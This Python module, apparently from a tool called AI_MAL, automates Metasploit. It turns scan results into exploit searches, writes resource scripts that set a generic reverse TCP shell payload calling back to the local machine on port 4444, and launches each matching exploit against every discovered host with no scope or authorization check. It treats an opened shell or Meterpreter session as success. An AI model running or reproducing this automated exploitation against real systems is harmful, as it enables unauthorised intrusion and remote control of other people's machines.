#!/usr/bin/env python3
"""
Metasploit integration module for AI_MAL
"""

import asyncio
import json
import logging
import os
import re
from typing import Dict, List, Optional, Any
from datetime import datetime
import subprocess
from pathlib import Path

logger = logging.getLogger(__name__)

class MetasploitManager:
    def __init__(self):
        self.msf_resources_dir = os.getenv('MSF_RESOURCES_DIR', 'msf_resources')
        os.makedirs(self.msf_resources_dir, exist_ok=True)
        # Verify Metasploit is installed
        self._check_metasploit()

    def _check_metasploit(self):
        """Verify Metasploit is installed and available"""
        try:
            result = subprocess.run(['which', 'msfconsole'], 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, 
                                  text=True, 
                                  check=False)
            
            if result.returncode != 0:
                logger.warning("Metasploit Framework not found. Some features may not work.")
            else:
                logger.info(f"Metasploit Framework found at: {result.stdout.strip()}")
                
        except Exception as e:
            logger.warning(f"Error checking for Metasploit: {str(e)}")

    async def find_exploits(self, scan_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Find potential Metasploit exploits based on scan results
        """
        try:
            exploits = []
            
            for host in scan_results.get('hosts', []):
                host_ip = host.get('ip')
                if not host_ip:
                    continue
                    
                for port in host.get('ports', []):
                    # Extract service info
                    service = port.get('service', '').lower()
                    version = port.get('version', '')
                    port_num = port.get('port')
                    
                    if not service or not port_num:
                        continue
                    
                    # Skip common services that would generate too many results
                    if service in ['ssh', 'http', 'https'] and not version:
                        continue
                    
                    # Search for exploits based on service information
                    logger.info(f"Searching exploits for {service} {version} on port {port_num}")
                    service_exploits = await self._search_exploits(
                        service=service,
                        product=service.split()[0],
                        version=version
                    )
                    
                    if service_exploits:
                        # Add host and port info to each exploit
                        for exploit in service_exploits:
                            exploit['target_host'] = host_ip
                            exploit['target_port'] = port_num
                        
                        exploits.extend(service_exploits)
                        logger.info(f"Found {len(service_exploits)} potential exploits for {service}")
            
            # Sort exploits by rank (great, excellent, good)
            exploits.sort(key=lambda x: {
                'excellent': 0, 
                'great': 1, 
                'good': 2
            }.get(x.get('rank', '').lower(), 999))
            
            return exploits
            
        except Exception as e:
            logger.error(f"Error finding exploits: {str(e)}")
            return []

    async def run_exploits(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Run identified exploits using Metasploit
        """
        try:
            results = []
            
            for exploit in exploits:
                # Skip exploits without target information
                if not exploit.get('target_host') or not exploit.get('target_port'):
                    continue
                
                exploit_name = exploit.get('name', 'unknown')
                logger.info(f"Preparing to run exploit {exploit_name}")
                    
                # Generate resource script
                resource_script = self._generate_resource_script(exploit)
                
                # Save resource script
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                safe_name = exploit_name.replace("/", "_").replace("\\", "_")
                script_path = os.path.join(
                    self.msf_resources_dir,
                    f'exploit_{safe_name}_{timestamp}.rc'
                )
                
                with open(script_path, 'w') as f:
                    f.write(resource_script)
                
                # Run exploit
                logger.info(f"Running exploit {exploit_name} using resource script {script_path}")
                result = await self._run_msf_console(script_path)
                
                results.append({
                    "exploit": exploit,
                    "result": result,
                    "script_path": script_path
                })
            
            return results
            
        except Exception as e:
            logger.error(f"Error running exploits: {str(e)}")
            return []

    async def _search_exploits(
        self,
        service: str,
        product: str,
        version: str
    ) -> List[Dict[str, Any]]:
        """
        Search for exploits in Metasploit
        """
        try:
            # Clean up search terms
            service = service.strip().split()[0]  # Use just the first word
            product = product.strip()
            version = version.strip()
            
            # Build search query
            search_terms = []
            if service:
                search_terms.append(service)
            if product and product != service:
                search_terms.append(product)
            if version:
                search_terms.append(version)
                
            if not search_terms:
                return []
                
            search_query = " ".join(search_terms)
            
            # Build search command
            cmd = [
                'msfconsole',
                '-q',
                '-x',
                f'search type:exploit {search_query}; exit'
            ]
            
            # Run search
            logger.debug(f"Running MSF search command: {' '.join(cmd)}")
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode()
            
            if process.returncode != 0 or "Error:" in output:
                logger.error(f"Exploit search failed: {stderr.decode()}")
                return []
            
            # Parse results
            results = []
            lines = output.strip().split('\n')
            
            for line in lines:
                if line and ('exploit/' in line or 'auxiliary/' in line) and not line.startswith('='):
                    # Parse using regex to handle inconsistent spacing
                    match = re.match(r'\s*(\S+)\s+(\S+)\s+(\S+)\s+(.*)', line)
                    if match:
                        module_name, disclosure_date, rank, description = match.groups()
                        results.append({
                            "name": module_name,
                            "disclosure_date": disclosure_date,
                            "rank": rank,
                            "description": description
                        })
            
            return results
            
        except Exception as e:
            logger.error(f"Error searching exploits: {str(e)}")
            return []

    def _generate_resource_script(self, exploit: Dict[str, Any]) -> str:
        """
        Generate Metasploit resource script for an exploit
        """
        try:
            # Basic details
            target_host = exploit.get('target_host', '127.0.0.1')
            target_port = exploit.get('target_port', '')
            local_ip = self._get_local_ip()
            
            script = f"""# Resource script for {exploit['name']}
# Generated on {datetime.now().isoformat()}

# Load the exploit
use {exploit['name']}

# Set target information
set RHOSTS {target_host}
"""
            
            # Only set port if it's provided
            if target_port:
                script += f"set RPORT {target_port}\n"
                
            # Set payload information for exploits (not for auxiliary modules)
            if 'exploit/' in exploit['name']:
                script += f"""
# Set payload information
set LHOST {local_ip}
set LPORT 4444
set PAYLOAD generic/shell_reverse_tcp

# Set exploit options
set VERBOSE true
set ConsoleLogging true

# Run the exploit
exploit -j
"""
            else:
                # For auxiliary modules
                script += """
# Set module options
set VERBOSE true
set ConsoleLogging true

# Run the module
run
"""
            
            return script
            
        except Exception as e:
            logger.error(f"Error generating resource script: {str(e)}")
            return f"# Error generating script: {str(e)}"

    def _get_local_ip(self) -> str:
        """
        Get local IP address
        """
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            logger.error(f"Error getting local IP: {str(e)}")
            return "127.0.0.1"

    async def _run_msf_console(self, resource_script: str) -> Dict[str, Any]:
        """
        Run Metasploit console with resource script
        """
        try:
            # Build command
            cmd = [
                'msfconsole',
                '-q',
                '-r',
                resource_script
            ]
            
            # Run console
            logger.debug(f"Running MSF console command: {' '.join(cmd)}")
            start_time = datetime.now()
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Set a timeout for MSF console (5 minutes)
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
                output = stdout.decode()
                error = stderr.decode()
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                # Check for success indicators
                success = False
                if "Exploit completed" in output or "Meterpreter session" in output or "Command shell session" in output:
                    success = True
                    
                return {
                    "status": "success" if success else "completed",
                    "output": output,
                    "error": error,
                    "duration": duration
                }
                
            except asyncio.TimeoutError:
                # Kill the process if it times out
                try:
                    process.kill()
                except:
                    pass
                    
                return {
                    "status": "timeout",
                    "output": "Operation timed out after 5 minutes",
                    "error": "Timeout occurred",
                    "duration": 300
                }
            
        except Exception as e:
            logger.error(f"Error running MSF console: {str(e)}")
            return {
                "status": "error",
                "output": "",
                "error": str(e),
                "duration": 0
            } 